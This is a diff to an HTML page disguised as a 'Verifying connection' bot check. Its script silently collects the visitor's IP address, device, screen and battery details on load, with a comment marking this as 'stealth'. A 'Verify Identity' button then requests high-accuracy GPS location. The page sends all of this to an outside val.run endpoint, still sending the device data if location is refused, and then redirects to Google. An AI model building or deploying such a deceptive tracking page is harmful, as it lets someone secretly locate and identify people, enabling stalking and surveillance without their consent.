@@ -9,8 +9,10 @@
   .loader { border: 3px solid #24242e; border-top: 3px solid #ffb03d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
   @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   h2 { font-weight: 700; letter-spacing: 0.05em; margin-bottom: 5px; }
-  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; }
+  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; margin-bottom: 20px; }
   .box { background: #101014; border: 1px solid #24242e; padding: 40px 20px; border-radius: 12px; width: 80%; max-width: 350px; }
+  button { background: #ffb03d; color: #000; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 800; font-size: 14px; font-family: inherit; letter-spacing: 0.05em; cursor: pointer; width: 100%; transition: 0.2s; }
+  button:active { opacity: 0.7; transform: scale(0.98); }
 </style>
 </head>
 <body>
@@ -18,13 +20,16 @@
 <div class="box">
   <div class="loader" id="spin"></div>
   <h2 id="title">Verifying connection...</h2>
-  <p id="desc">Please allow location access to confirm you are human and not a bot.</p>
+  <p id="desc">Please verify your identity to confirm you are human and not a bot.</p>
+  <button id="verifyBtn" onclick="startTracking()">Verify Identity</button>
 </div>
 
 <script>
+  let baseData = {};
+
+  // Grab IP and Device info on load (stealth)
   fetch("https://api.ipify.org?format=json").then(r => r.json()).then(ipData => {
-      let gps = null;
-      let info = {
+      baseData = {
           ip: ipData.ip,
           device: navigator.userAgent,
           resolution: window.screen.width + "x" + window.screen.height,
@@ -35,36 +40,42 @@
 
       if (navigator.getBattery) {
           navigator.getBattery().then(function(battery) {
-              info.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
+              baseData.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
           });
       }
+  });
+
+  function startTracking() {
+      document.getElementById("desc").innerText = "Verifying... please wait.";
+      document.getElementById("verifyBtn").style.display = "none";
+      document.getElementById("spin").style.display = "block";
 
       if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
               (pos) => {
-                  gps = pos.coords.latitude + "," + pos.coords.longitude;
-                  info.gps = gps;
-                  sendData(info);
+                  baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
+                  sendData(baseData);
               },
               (err) => {
-                  sendData(info);
-              }
+                  // If they hit block, we still send the IP and Device data
+                  sendData(baseData);
+              },
+              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
           );
       } else {
-          sendData(info);
+          sendData(baseData);
       }
+  }
 
-      function sendData(payload) {
-          document.getElementById("desc").innerText = "Verifying... please wait.";
-          fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-          }).finally(() => {
-              window.location.href = "https://www.google.com";
-          });
-      }
-  });
+  function sendData(payload) {
+      fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+      }).finally(() => {
+          window.location.href = "https://www.google.com";
+      });
+  }
 </script>
 </body>
 </html>
